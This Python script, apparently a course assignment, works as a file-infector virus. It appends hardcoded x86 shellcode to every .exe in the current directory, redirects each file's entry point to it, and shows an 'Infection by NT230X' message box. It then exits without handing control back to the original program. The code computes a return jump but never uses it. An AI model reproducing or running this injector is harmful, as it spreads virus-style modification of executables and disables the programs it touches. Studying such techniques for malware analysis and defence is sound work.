import pefile
import os
import mmap
import shutil
import struct
import ctypes


def get_message_box_w(pe):
    # Get the MessageBoxW
    address_of_message_box_w = None
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        dll_name = entry.dll.decode('utf-8')
        if dll_name == "USER32.dll":
            for func in entry.imports:
                if func.name.decode('utf-8') == "MessageBoxW":
                    address_of_message_box_w = func.address

    if not address_of_message_box_w:
        print("[-] PE file not imported MessageBoxW")
        return False

    return address_of_message_box_w

# Get the info section about number of sections and last section

def get_info_section(pe):
    # Get some info about section
    number_of_sections = pe.FILE_HEADER.NumberOfSections
    return number_of_sections

# Align function


def align(value, alignment):
    return ((value+alignment-1) / alignment) * alignment

# Create payload



def add_more_space(input, output):
    # Get original_size and add more space to file pe
    shutil.copy2(input, output)

    original_size = os.path.getsize(output)
    fd = open(output, 'a+b')
    map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
    map.resize(original_size + 0x1000)
    map.close()
    fd.close()

    return original_size


def injected_shell_code(input, output):
    # Path to pe file
    original_size = add_more_space(input, output)
    pe = pefile.PE(output)
    raw_address_of_shell_code = original_size
    number_of_sections = get_info_section(pe)

    # Get the last section
    last_section = pe.sections[-1]

    # Get the image base and old entry points
    image_base = pe.OPTIONAL_HEADER.ImageBase
    entry_point_old = pe.OPTIONAL_HEADER.AddressOfEntryPoint

    # Calc the last section virtual offset and raw offset
    last_section_virtual_offset = last_section.VirtualAddress + \
        last_section.Misc_VirtualSize
    last_section_raw_offset = last_section.PointerToRawData + last_section.SizeOfRawData

    # Locate where to inject shell_code
    raw_address_of_caption = raw_address_of_shell_code + 0x50
    raw_address_of_text = raw_address_of_shell_code + 0x80

    # Calc Caption, Tex, new entry point
    virtual_address_of_caption = raw_address_of_caption - \
        last_section.PointerToRawData + last_section.VirtualAddress + image_base
    virtual_address_of_text = raw_address_of_text - \
        last_section.PointerToRawData + last_section.VirtualAddress + image_base
    new_entry_point = raw_address_of_shell_code - \
        last_section.PointerToRawData + last_section.VirtualAddress + image_base

    # Calc old entry point
    jump_address = ((entry_point_old + image_base) - 5 -
                    (new_entry_point + 0x14)) & 0xffffffff

    # Get the address of message box w
    address_of_message_box_w = get_message_box_w(pe)

    #shell_code = create_shell_code(
        #virtual_address_of_caption, virtual_address_of_text, jump_address, address_of_message_box_w)

    shell_code = bytes(
b""
b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31"
b"\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b"
b"\x46\x08\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3"
b"\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45"
b"\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
b"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31"
b"\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
b"\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a"
b"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb"
b"\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
b"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec"
b"\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8"
b"\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
b"\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
b"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d"
b"\xbc\x87\x1c\x24\x52\xe8\x5f\xff\xff\xff\x68\x33"
b"\x30\x58\x20\x68\x20\x4e\x54\x32\x68\x6e\x20\x62"
b"\x79\x68\x63\x74\x69\x6f\x68\x49\x6e\x66\x65\x31"
b"\xdb\x88\x5c\x24\x12\x89\xe3\x68\x36\x32\x58\x20"
b"\x68\x35\x32\x30\x35\x68\x37\x20\x32\x30\x68\x32"
b"\x31\x36\x31\x68\x20\x32\x30\x35\x68\x31\x31\x38"
b"\x34\x68\x31\x39\x35\x32\x31\xc9\x88\x4c\x24\x1a"
b"\x89\xe1\x31\xd2\x6a\x40\x53\x51\x52\xff\xd0\x31"
b"\xc0\x50\xff\x55\x08"

)

    # Inject shell code
    print("\nShell-code : ")
    print(shell_code)

    print("Inject Shellcode at : ", hex(raw_address_of_shell_code))
    print("Inject Caption at: ", hex(raw_address_of_caption))
    print("Inject Text at: ", hex(raw_address_of_text))

    if pe.sections[-1].SizeOfRawData == 0 and pe.sections[-1].PointerToRawData == 0:
        pass
    else:
       pe.set_bytes_at_offset(raw_address_of_shell_code, shell_code)

    # Resize VirtualSize and RawData
    entry_points_fix = new_entry_point - image_base
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = entry_points_fix
    last_section.Misc_VirtualSize += 0x1000
    last_section.SizeOfRawData += 0x1000
    pe.OPTIONAL_HEADER.SizeOfImage += 0x1000

    pe.write(output)
    print("Inject Successfully!!")

# get list of executable files in directory
exe_files = [f for f in os.listdir('.') if f.endswith('.exe')]
for exe_file in exe_files:
    print(exe_file)

for input_file in exe_files:
    output_file = input_file.replace('.exe', '-injected.exe')
    print("\nInjecting ", input_file)
    injected_shell_code(input_file, output_file)

    for exe_file in exe_files:
      print(exe_file)

